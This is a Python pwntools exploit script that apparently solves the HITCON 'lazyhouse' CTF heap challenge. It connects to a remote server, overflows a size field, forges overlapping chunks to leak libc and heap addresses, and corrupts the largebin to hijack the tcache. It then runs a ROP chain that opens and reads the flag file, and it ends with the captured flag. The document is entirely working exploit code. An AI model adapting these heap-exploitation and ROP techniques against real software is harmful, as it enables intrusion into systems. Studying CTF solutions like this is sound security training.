#!/usr/bin/env python2
from pwn import *
from IPython import embed

context.arch = 'amd64'

r = remote('3.115.121.123', 5731)

def buy(idx, sz, data, err=0):
    r.sendlineafter('choice: ', '1')
    r.sendlineafter('Index:', str(idx))
    r.sendlineafter('Size:', str(sz))
    if err == 0:
        r.sendafter('House:', data)

def show(idx):
    r.sendlineafter('choice: ', '2')
    r.sendlineafter('Index:', str(idx))
    return r.recvuntil('$$$$$$', drop=True)

def sell(idx):
    r.sendlineafter('choice: ', '3')
    r.sendlineafter('Index:', str(idx))

def upgrade(idx, data):
    r.sendlineafter('choice: ', '4')
    r.sendlineafter('Index:', str(idx))
    r.sendafter('House:', data)

def super_house(data):
    r.sendlineafter('choice: ', '5')
    r.sendlineafter('House:', data)

# FA-DA-TSAIIIII!!!
buy(0, 2792397038680803685, 'a', err=1)
sell(0)

# overlapped chunk
buy(0, 0x88, 'a')
buy(1, 0x428, 'a')
buy(2, 0x428, 'a')
buy(3, 0x218, 'a')
buy(4, 0xb8, 'a')
buy(5, 0x88, 'a')
# overflow size
upgrade(0, 'a'*0x88+flat(0x430+0x430+0x220+0xc0+1))
sell(1)
# sell(2)

# leak libc
buy(1, 0x438, 'a'*0x428+flat(0x431))
x = show(2)
libc = u64(x[0x10:0x18]) - 0x1e4ca0
print 'libc:', hex(libc)

# leak heap
buy(6, 0x218, 'a')
sell(3)
sell(6)
x = show(2)
heap = u64(x[0x10:0x18]) - 0xb50
print 'heap:', hex(heap)

# clear slots
sell(0)
buy(0, 0x88, 'a')
sell(0)
# largebin 0x450
buy(0, 0x448, 'a'*0x160+flat([
    0, 0x21,
    0, 0x21,
    0, 0x21,
    0, 0x21,
    0, 0x21,
]))
__malloc_hook = libc+0x1e4c30
buy(6, 0x458, flat(
    0, 0,
    0, 0,
    1, 0,
    0, 0,
    0, 0,
    [0, 0]*14,
    __malloc_hook
))                  # largebin 0x460
buy(3, 0x88, 'a')

# large bin corruption
tcache_ptr = libc+0x1ec4b0
print 'tcache_ptr:', hex(tcache_ptr)
sell(1)                 # largebin 0x440
sell(0)
buy(0, 0x500, 'a')
sell(2)
buy(2, 0x428, 'A'*0x2b0+flat(
    0, 0x451,
    0x7122, tcache_ptr-0x10,
    0x7122, tcache_ptr-0x20,
))
sell(6)

pop_rsi = libc + 0x26f9e
pop_rdi = libc + 0x26542
pop_rdx = libc + 0x12bda6
pop_rax = libc + 0x47cf8
syscall = libc + 849605
libc_open = libc + 0x10cc80
libc_read = libc + 0x10cf70
libc_write = libc + 0x10d010
path = heap + 0x18c0
rop_addr = heap + 0x18c0+0x100
rop = [
    pop_rdi, path,
    pop_rsi, 0,
    pop_rax, 2,
    syscall,
    pop_rdi, 3,
    pop_rsi, heap + 0x50,
    pop_rdx, 0x1000,
    pop_rax, 0,
    syscall,
    pop_rdi, 1,
    pop_rsi, heap + 0x50,
    pop_rdx, 0x1000,
    pop_rax, 1,
    syscall,
]

buy(1, 0x500, '/home/lazyhouse/flag\x00'.ljust(0x100, '\x00')+ flat(rop))

lea_rbp_0x28 = libc + 0xd8db1
super_house(flat(lea_rbp_0x28))
#raw_input("@")
buy(7, rop_addr-0x8, 'a', err=1)


r.interactive()
#hitcon{from_sm4llbin_2_tc4hc3_from_tcach3_to_RCE}
